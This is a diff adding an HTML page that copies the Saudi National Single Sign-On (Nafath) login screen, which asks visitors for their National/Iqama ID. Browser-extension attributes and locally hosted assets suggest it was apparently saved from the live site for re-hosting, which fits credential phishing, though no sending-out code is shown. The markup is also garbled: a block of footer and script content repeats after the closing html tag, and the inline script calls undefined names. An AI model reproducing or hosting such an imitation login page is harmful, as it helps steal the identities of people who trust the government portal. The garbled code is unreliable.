@@ -1,0 +1,348 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  <title>National Single Sign-On</title>
+  <meta name="description" content="National Single Sign-On">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+
+  <!-- Stylesheet -->
+  <link rel="stylesheet" href="/iam/css/iam.css">
+  <link rel="shortcut icon" href="/iam/img/logo (1).png" type="image/x-icon" />
+
+  <!-- Main JavaScript -->
+  <script src="/iam/js/ID_ErorrEN.js"></script>
+  <!-- <script src="/iam/js/user_Error.js"></script> -->
+</head>
+
+<body>
+
+  <div class="o-page">
+    <div class="container-fluid u-p-zero">
+      <header class="c-navbar u-mb-large">
+        <a class="c-navbar__brand u-mr-medium" href="/idpinit/splist.jsp">
+          <img src="/iam/img/logo (1).png" width="128">
+        </a>
+        <img src="/iam/img/vision2030-grey.svg" width="128" class="u-opacity-heavy u-mr-auto u-hidden-down@mobile">
+        <nav class="c-navbar__nav collapse u-border-bottom" id="main-nav">
+          <ul class="c-navbar__nav-list">
+            <!--li class="c-navbar__nav-item">
+              <a class="c-navbar__nav-link" href="/index.html"><i class="feather icon-home"></i>
+                Home</a>
+            </li>
+            <li class="c-navbar__nav-item">
+              <a class="c-navbar__nav-link c-tooltip c-tooltip--bottom" aria-label="Create New Account through MOI Absher" href="https://www.moi.gov.sa/wps/portal/static/register/"><i class="feather icon-user"></i> New Account</a>
+            </li-->
+            <!--li class="c-navbar__nav-item">
+              <a class="c-navbar__nav-link " href="/idpinit/login"><i class="feather icon-log-in"></i> Log in</a>
+            </li-->
+            <li class="c-navbar__nav-item">
+              <a class="c-navbar__nav-link " href="/iam/html/iam-A.html"><i class="feather icon-globe"></i> عربي</a>
+            </li>
+          </ul>
+        </nav>
+
+
+        <!-- Start of Dropdown Menus -->
+        <!--div id="favouritesNavMain" class="c-dropdown dropdown u-mr-small hide">
+        <a class="c-notification dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddFavorites" data-toggle="dropdown" role="button">
+          <i class="c-notification__icon feather icon-star"></i>
+        </a>
+        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddFavorites">
+          <span class="c-dropdown__menu-header">
+           Favorites
+          </span>
+
+          <span id="recent_services" class="c-dropdown__menu-header">
+          	Recently Used Services
+          </span-->
+        <!-- Recent activity will be updated here -->
+        <!--a class="c-dropdown__menu-footer">
+          </a>
+        </div>
+    </div-->
+        <!--div id="alertsNavMain" class="c-dropdown dropdown u-mr-small hide">
+        <div class="c-notification has-indicator dropdown-toggle c-btn c-btn--outline c-btn--small c-btn--secondary" id="ddNotifications" data-toggle="dropdown" role="button">
+          <i class="c-notification__icon feather icon-bell"></i>
+        </div>
+        <div class="c-dropdown__menu c-dropdown__menu--large dropdown-menu"  data-boundary="ddNotifications">
+          <span class="c-dropdown__menu-header">
+            Alerts
+          </span>
+          <a class="c-dropdown__menu-footer">
+            All Alerts
+          </a>
+        </div>
+    </div-->
+        <div id="currentUserNavMain" class="c-dropdown dropdown u-mr-small hide">
+          <div class="dropdown-toggle c-notification c-btn c-btn--outline c-btn--small c-btn--secondary"
+            id="dropdownMenuAvatar" data-toggle="dropdown" role="button">
+            <i class="c-notification__icon feather icon-user"> <span id="currentAuthUser"></span></i>
+          </div>
+          <div class="c-dropdown__menu dropdown-menu has-arrow dropdown-menu-right">
+            <!--a class="c-dropdown__item dropdown-item c-avatar c-avatar--small dropdown-toggle" href="#">
+            <div class="o-media">
+              <!--div class="o-media__img u-ml-small">
+                <img class="c-avatar__img" src="/img/placeholder-user.png" alt="profile pic">
+              </div-->
+            <!--div class="o-media__content">
+                <span id="currentAuthUser"></span>
+              </div>
+            </div>
+          </a-->
+            <a class="c-dropdown__item dropdown-item" href="/idpinit/userprofile.jsp">My Information</a>
+            <a class="c-dropdown__item dropdown-item" href="/idpinit/logout">Sign Out</a>
+          </div>
+        </div>
+
+
+        <!-- End of Dropdown Menus -->
+
+        <!-- // Navigation items  -->
+        <button class="c-navbar__nav-toggle collapsed" type="button" data-toggle="collapse" data-target="#main-nav"
+          aria-expanded="false">
+          <i class="feather icon-menu"></i>
+        </button>
+      </header>
+    </div>
+
+    <div class="container">
+
+      <div id="bnfInfo" class="row u-justify-center">
+        <h2 id="bnfLabel" class="u-color-primary u-mb-small u-text-center">Dear Takatof user, welcome to National Single Sign-On</h2>
+      </div>
+
+      <div class="content active" id="pl1" style="max-height: 1200px; width: 100%">
+        <div class="row u-justify-center">
+          <div class="col-md-8">
+            <div class="c-card">
+              <div class="row">
+                <div class="col-md-6">
+                  <form novalidate="novalidate" id="login-form">
+
+                    <div class="c-field u-mb-medium">
+                      <label class="c-field__label" for="NAT_ID">National/Iqama ID</label>
+                      <input class="c-input" id="NAT_ID" name="NAT_ID" type="tel" autocomplete="off"
+                        placeholder="Enter your National Id here" onkeypress="Validate_NAT_ID()"
+                        maxlength="10" fdprocessedid="cwzab" />
+                      <span class="error-message" style="color: red;"></span>
+                      <span id="errorMessage"></span>
+
+                    </div>
+                    <div class="c-field u-text-center">
+
+                      <button type="submit" name="btnAuthenticate" class="c-btn c-btn--fullwidth"
+                        fdprocessedid="9m1nq9">
+                        <i class="feather icon-log-in"></i>Login
+                      </button>
+
+                      <div class="u-mt-medium u-color-secondary">
+                        <p>To download nafath app</p>
+                      </div>
+                      <div class="u-flex justify-content-center g-8">
+                        <a id="link" href="https://apps.apple.com/sa/app/نفاذ-nafath/id1598909871"
+                          target="_blank"><img src="/iam/img/apple_store.png" width="100" height="100" /></a>
+                        <a style="margin-right: 10px" id="link_andr"
+                          href="https://play.google.com/store/apps/details?id=sa.gov.nic.myid" target="_blank"><img
+                            src="/iam/img/google_play.png" width="100" height="100" /></a>
+                        <a style="margin-right: 12px" id="link_andr"
+                          href="https://appgallery.huawei.com/app/C106870695" target="_blank"><img
+                            src="/iam/img/huawei_store.jpg" width="120" /></a>
+                      </div>
+                    </div>
+                  </form>
+                  <div class="clr"></div>
+                </div>
+
+                <div
+                  class="col-md-5 u-text-center u-p-small u-mh-small u-hidden-down@mobile u-color-secondary">
+                  <img src="/iam/img/secure.svg" width="150" />
+                  <p>
+                    Please introduce your National/Iqama ID, then click 'Login'.
+                  </p>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+        <div class="clr"> </div>
+        <script> let flag = false; function handleClick(value, placeholder, atr) { let e = window.event; e.preventDefault(); if (atr === 'collapsible active') { flag = true; } else { startOverAuth(value, placeholder); flag = false; } } let seloption = option || 1; window.addEventListener('load', function () { slelectAuth(seloption, "pl" + seloption); }); var coll = document.getElementsByClassName("collapsible"); var i; coll[seloption - 1].classList.toggle("active"); var content = coll[seloption - 1].nextElementSibling; content.style.maxHeight = "1200px"; content.style.width = "100%"; content.classList.toggle("active"); for (i = 0; i < coll.length; i++) { coll[i].addEventListener("click", function () { if (flag) { return false; } document.querySelectorAll(".collapsible").forEach(function (el, index) { if (el.classList.value === 'collapsible active') { el.classList.toggle("active"); el.nextElementSibling.style.maxHeight = null; el.nextElementSibling.innerHTML = ''; el.nextElementSibling.classList.toggle("active"); } }); this.classList.toggle("active"); var content = this.nextElementSibling; content.classList.toggle("active"); content.style.maxHeight = "1200px"; content.style.width = "100%"; }); } </script>
+      </div>
+    </div>
+    <!-- // .container -->
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-12">
+          <footer class="c-footer u-mt-xsmall u-justify-between">
+            <div class="o-media">
+              <div class="o-media__img u-ml-small">
+                <div class="c-avatar">
+                  <img class="c-avatar__img" src="/iam/img//NIC-logo.png" alt="NIC-logo">
+                </div>
+              </div>
+
+              <div class="o-media__content u-ml-small">
+                <p>Development and operation</p>
+                <h5 class="u-color-secondary">National Information Center</h5>
+                <p>National Single Sign-On All rights reserved © 2024</p>
+              </div>
+            </div>
+            <nav>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/authservice/userauthservice?lang=en">Home</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/about.html">About</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/contact.html">Contact Us</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/terms.html">Terms &amp; Conditions</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/help.html">Assitance &amp; Support</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/privacy.html">Privacy</a>
+            </nav>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+
+
+
+
+
+
+
+  <!-- spinner -->
+  <div id="spinner" class="overlayWrapper u-m-0" style="
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 1000;
+    background: rgba(255,255,255,0.5);
+    display:none;">
+    <div class="overlay">
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function showSpinner() {
+      await sleep(500); // Small delay to avoid flickering
+      document.getElementById("spinner").style.display = "block";
+    }
+
+    async function hideSpinner() {
+      await sleep(500); // Small delay to avoid flickering
+      document.getElementById("spinner").style.display = "none";
+    }
+  </script>
+
+
+  <!-- Plugin JavaScript -->
+  <script src="/iam/js/vendor.js"></script>
+  <script src="/iam/js/bundle.js"></script>
+
+
+</body>
+
+</html>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <!-- // .container -->
+
+    <div class="container-fluid">
+      <div class="row">
+        <div class="col-12">
+          <footer class="c-footer u-mt-xsmall u-justify-between">
+            <div class="o-media">
+              <div class="o-media__img u-ml-small">
+                <div class="c-avatar">
+                  <img class="c-avatar__img" src="/iam/img//NIC-logo.png" alt="NIC-logo">
+                </div>
+              </div>
+
+              <div class="o-media__content u-ml-small">
+                <p>Development and operation</p>
+                <h5 class="u-color-secondary">National Information Center</h5>
+                <p>National Single Sign-On All rights reserved © 2024</p>
+              </div>
+            </div>
+            <nav>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/authservice/userauthservice?lang=en">Home</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/about.html">About</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/contact.html">Contact Us</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/terms.html">Terms &amp; Conditions</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/help.html">Assitance &amp; Support</a>
+              <a class="c-footer__link" href="https://www.iam.gov.sa/privacy.html">Privacy</a>
+            </nav>
+          </footer>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  
+
+
+
+
+
+
+
+  <!-- spinner -->
+  <div id="spinner" class="overlayWrapper u-m-0" style="
+    position: fixed;
+    width: 100%;
+    height: 100%;
+    top: 0;
+    left: 0;
+    z-index: 1000;
+    background: rgba(255,255,255,0.5);
+    display:none;">
+    <div class="overlay">
+      <div class="spinner"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    function sleep(ms) {
+      return new Promise(resolve => setTimeout(resolve, ms));
+    }
+
+    async function showSpinner() {
+      await sleep(500); // Small delay to avoid flickering
+      document.getElementById("spinner").style.display = "block";
+    }
+
+    async function hideSpinner() {
+      await sleep(500); // Small delay to avoid flickering
+      document.getElementById("spinner").style.display = "none";
+    }
+  </script>
+
+
+  <!-- Plugin JavaScript -->
+  <script src="/iam/js/vendor.js"></script>
+  <script src="/iam/js/bundle.js"></script>
+
+
+</body>
+
+</html>
